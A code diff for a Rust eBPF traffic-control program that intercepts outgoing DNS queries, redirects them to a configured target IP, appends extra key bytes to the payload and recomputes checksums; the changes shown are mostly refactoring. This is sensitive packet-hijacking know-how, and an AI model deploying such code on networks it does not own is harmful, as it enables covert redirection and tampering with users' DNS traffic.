@@ -1,12 +1,9 @@
-use core::{net::Ipv4Addr, slice};
+use core::net::Ipv4Addr;
 
 use aya_ebpf::{
-    bindings::{__sk_buff, TC_ACT_OK, TC_ACT_PIPE},
+    bindings::TC_ACT_PIPE,
     cty::c_void,
-    helpers::{
-        bpf_csum_diff, bpf_csum_update, bpf_get_hash_recalc, bpf_set_hash_invalid,
-        bpf_skb_store_bytes,
-    },
+    helpers::{bpf_get_hash_recalc, bpf_set_hash_invalid, bpf_skb_store_bytes},
     macros::classifier,
     programs::{sk_buff::SkBuff, TcContext},
 };
@@ -98,7 +95,7 @@ fn update_dst_port(ctx: &TcContext, skb: &SkBuff, old_be: &u16, new_be: &u16) {
     log_csums(ctx);
 }
 
-fn update_udp_hdr_len(ctx: &TcContext, skb: &SkBuff, old_be: &u16, new_be: &u16) {
+fn update_udp_hdr_len(ctx: &TcContext, skb: &SkBuff, new_be: &u16) {
     info!(ctx, "updating udphdr len:");
     if unsafe {
         bpf_skb_store_bytes(
@@ -112,14 +109,6 @@ fn update_udp_hdr_len(ctx: &TcContext, skb: &SkBuff, old_be: &u16, new_be: &u16)
     {
         error!(ctx, "error writing new udp hdr len ");
     }
-    // if let Err(err) = (*skb).l4_csum_replace(
-    //     UDP_CSUM_OFFSET,
-    //     *old_be as u64,
-    //     *new_be as u64,
-    //     2 + BPF_F_PSEUDO_HDR + BPF_F_MARK_ENFORCE,
-    // ) {
-    //     error!(ctx, "error: {}", err);
-    // }
 
     log_csums(ctx);
 }
@@ -170,6 +159,9 @@ fn inject_udp_payload(ctx: &TcContext, skb: &SkBuff, offset: u32, new_be: &u32) 
 
     log_csums(ctx);
 }
+
+const DNS_PAYLOAD_SZ: usize = 38;
+
 fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
     let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
     let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
@@ -182,7 +174,9 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                 info!(&ctx, "\n-----\nNew intercepted request:\n-----");
 
                 let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?;
-                let dns_payload = &ctx.load::<[u8; 50]>(DNS_QUERY_OFFSET).map_err(|_| ())?;
+                let dns_payload = &ctx
+                    .load::<[u8; DNS_PAYLOAD_SZ]>(DNS_QUERY_OFFSET)
+                    .map_err(|_| ())?;
                 let skb = &ctx.skb;
 
                 let fixed_size_added_keys: [u8; 4] =
@@ -197,6 +191,7 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
 
                 log_csums(&ctx);
                 update_dst_addr(&ctx, skb, &addr, &target_ip.to_be());
+
                 update_ip_hdr_tot_len(
                     &ctx,
                     skb,
@@ -228,8 +223,8 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                     bpf_skb_store_bytes(
                         skb.skb,
                         DNS_QUERY_OFFSET as u32,
-                        dns_payload as *const [u8; 50] as *const c_void,
-                        50,
+                        dns_payload as *const [u8; DNS_PAYLOAD_SZ] as *const c_void,
+                        DNS_PAYLOAD_SZ as u32,
                         0,
                     )
                 } < 0
@@ -240,14 +235,13 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                 inject_udp_payload(
                     &ctx,
                     skb,
-                    DNS_QUERY_OFFSET as u32 + 50,
+                    DNS_QUERY_OFFSET as u32 + DNS_PAYLOAD_SZ as u32,
                     &keys_as_u32.to_be(),
                 );
 
                 update_udp_hdr_len(
                     &ctx,
                     skb,
-                    &udp_hdr.len,
                     &(u16::from_be(udp_hdr.len) + offset as u16).to_be(),
                 );
 
@@ -269,8 +263,9 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                 }
                 let udp_hdr_bytes = &ctx.load::<[u8; 8]>(UDP_OFFSET).map_err(|_| ())?;
 
-                let udp_payload_bytes =
-                    &ctx.load::<[u8; 50 + 4]>(DNS_QUERY_OFFSET).map_err(|_| ())?;
+                let udp_payload_bytes = &ctx
+                    .load::<[u8; DNS_PAYLOAD_SZ + 4]>(DNS_QUERY_OFFSET)
+                    .map_err(|_| ())?;
 
                 let new_cs = calculate_udp_checksum(
                     u32::from_be(header.src_addr),
@@ -311,5 +306,5 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
         }
     };
 
-    Ok(TC_ACT_OK)
+    Ok(TC_ACT_PIPE)
 }
